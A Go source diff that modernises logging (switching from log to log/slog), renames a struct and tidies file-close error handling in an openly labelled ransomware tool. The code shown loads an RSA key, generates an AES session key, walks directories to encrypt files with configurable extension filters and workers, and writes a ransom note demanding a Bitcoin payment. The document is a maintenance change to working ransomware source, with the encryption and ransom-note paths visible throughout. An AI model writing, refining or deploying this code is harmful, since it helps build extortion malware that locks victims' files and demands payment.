@@ -5,7 +5,7 @@ import (
 	"encoding/base64"
 	"errors"
 	"fmt"
-	"log"
+	"log/slog"
 	"os"
 	"path/filepath"
 	"strings"
@@ -16,7 +16,8 @@ import (
 	urfavecli "github.com/urfave/cli/v2"
 )
 
-type Ransom struct {
+// ransomData holds the template variables for the ransom note.
+type ransomData struct {
 	BitcoinAddress string
 	BitcoinCount   float64
 	PublicKey      string
@@ -107,33 +108,41 @@ func Encrypt(ctx *urfavecli.Context) error {
 	if err != nil {
 		return err
 	}
-	log.Println("RSA public key loaded")
+	slog.Info("RSA public key loaded")
 
-	log.Println("Generating new AES key for current session")
 	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)
 	if err != nil {
 		return err
 	}
+	slog.Debug("Generated AES session key")
 
 	encryptedAesKey, err := crypto.RsaEncrypt(plainAesKey, publicKey)
 	if err != nil {
 		return err
 	}
 
-	log.Printf("Running ransomware tool on %s", absolutePath)
-	log.Printf("Blacklisted extensions = %v", extBlacklist)
-	log.Printf("Whitelisted extensions = %v", extWhitelist)
-	log.Printf("Skipping hidden files/folders = %t", skipHidden)
-	log.Printf("Recursive = %t", recursive)
-	log.Printf("DryRun enabled = %t", dryRun)
-	log.Printf("Workers = %d", workers)
-	log.Printf("EncSuffix = %s", encSuffix)
-	log.Printf("Encrypted key size = %d", len(encryptedAesKey))
-	log.Printf("Encrypted key = %s", base64.StdEncoding.EncodeToString(encryptedAesKey))
-	log.Printf("BitcoinAddress = %s", bitcoinAddress)
-	log.Printf("BitcoinCount = %f", bitcoinCount)
-	log.Printf("Ransom file template = %s", ransomTemplatePath)
-	log.Printf("Ransom file name = %s", ransomFileName)
+	slog.Info("Starting encryption",
+		"path", absolutePath,
+		"workers", workers,
+		"dryRun", dryRun,
+		"recursive", recursive,
+		"encSuffix", encSuffix,
+	)
+	slog.Debug("Extension filters",
+		"blacklist", extBlacklist,
+		"whitelist", extWhitelist,
+		"skipHidden", skipHidden,
+	)
+	slog.Debug("Encrypted AES key",
+		"keySize", len(encryptedAesKey),
+		"base64Key", base64.StdEncoding.EncodeToString(encryptedAesKey),
+	)
+	slog.Debug("Ransom configuration",
+		"bitcoinAddress", bitcoinAddress,
+		"bitcoinCount", bitcoinCount,
+		"templatePath", ransomTemplatePath,
+		"fileName", ransomFileName,
+	)
 
 	files, err := fs.WalkAndCollect(absolutePath, extBlacklist, extWhitelist, skipHidden, recursive)
 	if err != nil {
@@ -173,16 +182,20 @@ func Decrypt(ctx *urfavecli.Context) error {
 	if err != nil {
 		return err
 	}
-	log.Println("RSA private key loaded")
+	slog.Info("RSA private key loaded")
 
-	log.Printf("Running ransomware tool on %s", absolutePath)
-	log.Printf("EncSuffix = %s", encSuffix)
-	log.Printf("DryRun enabled = %t", dryRun)
-	log.Printf("Recursive = %t", recursive)
-	log.Printf("Workers = %d", workers)
-	log.Printf("Whitelisted extensions = %v", extWhitelist)
-	log.Printf("Ransom file name = %s", ransomFileName)
-	log.Printf("Skipping hidden files/folders = %t", skipHidden)
+	slog.Info("Starting decryption",
+		"path", absolutePath,
+		"workers", workers,
+		"dryRun", dryRun,
+		"recursive", recursive,
+		"encSuffix", encSuffix,
+	)
+	slog.Debug("Decrypt filters",
+		"whitelist", extWhitelist,
+		"fileName", ransomFileName,
+		"skipHidden", skipHidden,
+	)
 
 	files, err := fs.WalkAndCollect(absolutePath, nil, extWhitelist, skipHidden, recursive)
 	if err != nil {
@@ -203,10 +216,10 @@ func Decrypt(ctx *urfavecli.Context) error {
 
 func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) error {
 	ransomPath := filepath.Join(dir, fileName)
-	log.Printf("Adding ransom file at %s", ransomPath)
+	slog.Info("Adding ransom file", "path", ransomPath)
 
 	if _, err := os.Stat(ransomPath); err == nil {
-		log.Printf("Ransom file already exists at %s. Skipping generation", ransomPath)
+		slog.Warn("Ransom file already exists, skipping", "path", ransomPath)
 		return nil
 	} else if !errors.Is(err, os.ErrNotExist) {
 		return err
@@ -231,13 +244,20 @@ func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKe
 	if err != nil {
 		return err
 	}
-	defer file.Close()
 
-	return tmpl.Execute(file, &Ransom{
+	execErr := tmpl.Execute(file, &ransomData{
 		BitcoinCount:   bitcoinCount,
 		BitcoinAddress: bitcoinAddress,
 		PublicKey:      textPublicKey,
 	})
+
+	if closeErr := file.Close(); execErr != nil {
+		return execErr
+	} else if closeErr != nil {
+		return closeErr
+	}
+
+	return nil
 }
 
 func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) error {
